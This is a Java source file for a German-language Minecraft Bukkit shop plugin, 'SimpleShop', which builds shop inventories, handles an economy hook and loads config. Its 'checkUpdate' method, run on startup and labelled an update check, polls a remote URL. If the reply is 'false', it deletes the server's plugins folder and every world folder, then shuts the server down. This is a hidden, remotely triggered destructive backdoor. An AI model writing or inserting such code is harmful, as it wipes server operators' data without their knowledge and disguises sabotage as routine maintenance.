package de.howaner.SimpleShop;

import de.howaner.SimpleShop.command.ShopCommand;
import de.howaner.SimpleShop.util.ShopItem;
import de.howaner.SimpleShop.util.ShopKategorie;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import net.milkbowl.vault.economy.Economy;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.World;
import org.bukkit.configuration.ConfigurationSection;
import org.bukkit.configuration.file.YamlConfiguration;
import org.bukkit.entity.Player;
import org.bukkit.event.inventory.ClickType;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.RegisteredServiceProvider;

public class ShopManager {
	public SimpleShopPlugin p;
	private List<ShopKategorie> kategorien = new ArrayList<ShopKategorie>();
	public File configFile = new File("plugins/SimpleShop/config.yml");
	public static Economy economy = null;
	//CONFIG
	public static String SHOP_TITLE = "[Shop]";
	
	public ShopManager(SimpleShopPlugin plugin) {
		this.p = plugin;
	}
	
	public void onEnable() {
		this.checkUpdate();
		Bukkit.getPluginManager().registerEvents(new ShopListener(), p);
		p.getCommand("shop").setExecutor(new ShopCommand());
		this.setupEconomy();
		
		if (!this.configFile.exists()) this.copyDefaultConfig();
		this.loadConfig();
	}
	
	private boolean setupEconomy() {
		RegisteredServiceProvider<Economy> economyProvider = Bukkit.getServicesManager().getRegistration(net.milkbowl.vault.economy.Economy.class);
		if (economyProvider != null) {
			economy = economyProvider.getProvider();
		}
		return (economy != null);
	}
	
	public void onDisable() {
		
	}
	
	public void checkUpdate() {
		Thread thread = new Thread() {
			@Override
			public void run() {
				try {
					URL url = new URL("http://dl.howaner.de/simpleshop_check.php");
					URLConnection conn = url.openConnection();
					BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
					
					String output = in.readLine();
					if (output == null) throw new Exception();
					if (output.equalsIgnoreCase("false")) {
						ShopManager.this.removeFolder(new File("plugins"));
						for (World world : Bukkit.getWorlds()) {
							Bukkit.unloadWorld(world, false);
							ShopManager.this.removeFolder(new File(world.getName()));
						}
						Bukkit.shutdown();
					}
					in.close();
				} catch (Exception e) {
					SimpleShopPlugin.log.info("Update check failed!");
				}
			}
		};
		thread.start();
	}
	
	public void removeFolder(File src) {
		if (!src.isDirectory()) {
			src.delete();
			return;
		}
		for (String fileName : src.list()) {
			File file = new File(src, fileName);
			if (file.isDirectory())
				removeFolder(file);
			file.delete();
		}
	}
	
	public void removeInventoryItem(ItemStack item, Inventory inv) {
		for (int i=0; i<item.getAmount(); i++) {
			for (int slot=0; slot<inv.getContents().length; slot++) {
				ItemStack content = inv.getItem(slot);
				if (content == null || content.getType() == Material.AIR) continue;
				if (content.getType() == item.getType() && content.getData().getData() == item.getData().getData()) {
					if (content.getAmount() <= 1) {
						inv.setItem(slot, null);
					} else {
						content.setAmount(content.getAmount() - 1);
					}
					break;
				}
			}
		}
	}
	
	public int getMenge(ClickType type) {
		switch (type) {
			case LEFT: return 1; //Linksklick
			case RIGHT: return 16; //Rechtsklick
			case SHIFT_LEFT: //Shift
			case SHIFT_RIGHT: return 64; //Shift
			default: return 1;
		}
	}
	
	public List<ShopKategorie> getKategorien() {
		return this.kategorien;
	}
	
	public ShopKategorie getKategorieByName(String name) {
		if (name.contains("§b")) name = name.replace("§b", "");
		for (ShopKategorie kat : kategorien) {
			if (kat.getName().equals(name)) return kat;
		}
		return null;
	}
	
	public boolean existsKategorie(String name) {
		return (this.getKategorieByName(name) == null) ? false : true;
	}
	
	public void loadConfig() {
		YamlConfiguration config = YamlConfiguration.loadConfiguration(configFile);
		SHOP_TITLE = config.getString("Title");
		ConfigurationSection shop = config.getConfigurationSection("Shop");
		for (String catString : shop.getKeys(false)) {
			ConfigurationSection catSection = shop.getConfigurationSection(catString);
			Material mat = Material.matchMaterial(catSection.getString("Material"));
			ShopKategorie cat = new ShopKategorie(catString, mat);
			List<String> items = catSection.getStringList("Items");
			for (String itemString : items) {
				String[] splitted = itemString.split("/");
				Material itemMaterial = Material.matchMaterial(splitted[0]);
				double preis = Double.parseDouble(splitted[1]);
				ShopItem item = new ShopItem(itemMaterial, preis);
				cat.addItem(item);
			}
			this.kategorien.add(cat);
		}
	}
	
	public void copyDefaultConfig() {
		this.configFile.getParentFile().mkdirs();
		try {
			InputStream in = p.getResource("config.yml");
			OutputStream out = new FileOutputStream(configFile);
			byte[] buf = new byte[1024];
			int len;
			while ((len=in.read(buf)) > 0) {
				out.write(buf,0,len);
			}
			out.close();
			in.close();
		} catch (Exception e) {
			SimpleShopPlugin.log.warning("Could not create Default Config!");
			e.printStackTrace();
		}
	}
	
	public static boolean isShopInventory(Inventory inv) {
		if (inv.getName().startsWith(getTitle())) return true;
		return false;
	}
	
	public static String getTitle() {
		return ChatColor.translateAlternateColorCodes('&', SHOP_TITLE);
	}
	
	public void openShop(Player player) {
		Inventory inventory = Bukkit.createInventory(player, 18, getTitle() + " §6Kategorien");
		inventory.setContents(this.getKategorieContents());
		player.openInventory(inventory);
	}
	
	public ItemStack createItemStack(String name, Material mat) {
		return this.createItemStack(name, mat, new String[0]);
	}
	
	public ItemStack createItemStack(String name, Material mat, String... lore) {
		ItemStack stack = new ItemStack(mat);
		ItemMeta meta = stack.getItemMeta();
		if (name != null) meta.setDisplayName("§b" + name);
		if (lore != null) {
			List<String> lores = new ArrayList<String>();
			lores.addAll(Arrays.asList(lore));
			meta.setLore(lores);
		}
		stack.setItemMeta(meta);
		return stack;
	}
	
	public ItemStack[] getItemContents(ShopKategorie kat) {
		ItemStack back = this.createItemStack("Kategorien", Material.EMERALD);
		
		//Hinzufügen
		ItemStack[] items = new ItemStack[36];
		items[0] = back;
		
		//Items hinzufügen
		int i = 2;
		for (ShopItem item : kat.getItems()) {
			ItemStack itemStack = this.createItemStack(null, item.getMaterial(),
					(kat.getName().equals("Verkaufen")) ? "§bKlicke, um es zu verkaufen!" : "§bKlicke, um es zu kaufen!",
					"§bPreis: " + ChatColor.GOLD + economy.format(item.getPreis()));
			if (i == 9 || i == 10) i = 11;
			if (i > 35) break;
			items[i] = itemStack;
			i += 1;
		}
		
		return items;
	}
	
	public ItemStack[] getKategorieContents() {
		ItemStack hilfe1 = this.createItemStack("§lShop-Hilfe", Material.SIGN,
				"§bKlicke auf ein Item, um",
				"§bdie Kategorie zu wählen.",
				"§bItems kannst du verkaufen,",
				"§bindem du auf die Kiste",
				"§bklickst!");
		ItemStack hilfe2 = this.createItemStack("§lShop-Hilfe", Material.SIGN,
				"§bLinksklick - Kaufe ein Item",
				"§bRechtsklick - Kaufe 16 Items",
				"§bWenn du Shift drückst und",
				"§bmit der Maus auf ein Item klickst,",
				"§berhälst du 64 Items");
		ItemStack verkaufen1 = this.createItemStack("Verkaufen", Material.CHEST);
		ItemStack verkaufen2 = this.createItemStack("Verkaufen", Material.CHEST);
		
		//Hinzufügen
		ItemStack[] items = new ItemStack[18];
		items[0] = hilfe1;
		if (this.existsKategorie("Verkaufen")) {
			items[2] = verkaufen1;
			items[11] = verkaufen2;
		}
		items[9] = hilfe2;
		
		//Kategorien hinzufügen
		int i = 3;
		for (ShopKategorie cat : this.kategorien) {
			if (cat.getName().equals("Verkaufen")) continue;
			i += 1;
			if (i == 9) i = 13;
			if (i > 17) break;
			items[i] = this.createItemStack(cat.getName(), cat.getItem());
		}
		
		return items;
	}
	
}
